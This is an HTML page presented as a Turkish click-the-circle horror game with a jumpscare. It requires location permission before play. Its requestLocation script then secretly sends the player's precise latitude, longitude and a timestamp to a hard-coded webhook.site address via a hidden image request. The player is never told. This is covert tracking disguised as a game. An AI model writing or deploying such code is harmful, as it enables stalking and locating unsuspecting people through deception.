<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Korku Oyunu - Konumlu</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #000;
      color: white;
      font-family: Arial, sans-serif;
      height: 100vh;
      overflow: hidden;
    }

    #permission-screen {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100%;
      text-align: center;
    }

    #game-container {
      display: none;
      position: relative;
      width: 100vw;
      height: 100vh;
    }

    #circle {
      width: 100px;
      height: 100px;
      background-color: crimson;
      border-radius: 50%;
      position: absolute;
      cursor: pointer;
      transition: 0.2s;
      box-shadow: 0 0 20px red;
    }

    #score-display {
      position: absolute;
      top: 20px;
      left: 20px;
      font-size: 1.5rem;
    }

    #jumpscare {
      display: none;
      position: absolute;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: black;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      flex-direction: column;
    }

    #jumpscare img {
      max-width: 100%;
      height: auto;
    }

    audio {
      display: none;
    }

    button {
      background: crimson;
      color: white;
      padding: 12px 24px;
      font-size: 18px;
      border: none;
      cursor: pointer;
      border-radius: 6px;
      margin-top: 20px;
    }
  </style>
</head>
<body>

<div id="permission-screen">
  <h1>Oyuna başlamak için konum izni vermelisin!</h1>
  <button onclick="requestLocation()">Konum İzni Ver</button>
</div>

<div id="game-container">
  <div id="score-display">Skor: 0</div>
  <div id="circle" onclick="handleClick()"></div>
  <div id="jumpscare">
    <img src="https://i.imgur.com/jxKX1U7.png" alt="Korku">
    <audio id="scream" src="https://www.myinstants.com/media/sounds/wilhelm-scream.mp3" autoplay></audio>
  </div>
</div>

<script>
  function requestLocation() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        position => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          // Konumu Webhook.site adresine gönder
          const img = new Image();
          img.src = "https://webhook.site/f5dc1b3e-8719-4c26-bd5e-23fe7a13ba34?lat=" + lat + "&lon=" + lon + "&time=" + new Date().toISOString();

          // Oyun başlasın
          document.getElementById("permission-screen").style.display = "none";
          document.getElementById("game-container").style.display = "block";
          randomPosition();
        },
        error => {
          alert("Konum izni vermelisin. Sayfayı yenileyip tekrar dene.");
        },
        { enableHighAccuracy: true }
      );
    } else {
      alert("Tarayıcın konum desteği sağlamıyor.");
    }
  }

  // Oyun değişkenleri
  let score = 0;
  const circle = document.getElementById("circle");
  const scoreDisplay = document.getElementById("score-display");
  const jumpscare = document.getElementById("jumpscare");
  const screamSound = document.getElementById("scream");

  function randomPosition() {
    const maxX = window.innerWidth - circle.offsetWidth;
    const maxY = window.innerHeight - circle.offsetHeight;
    const x = Math.random() * maxX;
    const y = Math.random() * maxY;
    circle.style.left = x + "px";
    circle.style.top = y + "px";
  }

  function handleClick() {
    score++;
    scoreDisplay.textContent = "Skor: " + score;
    randomPosition();

    if (score === 15) {
      triggerJumpscare();
    }
  }

  function triggerJumpscare() {
    jumpscare.style.display = "flex";
    screamSound.play();
  }
</script>

</body>
</html>
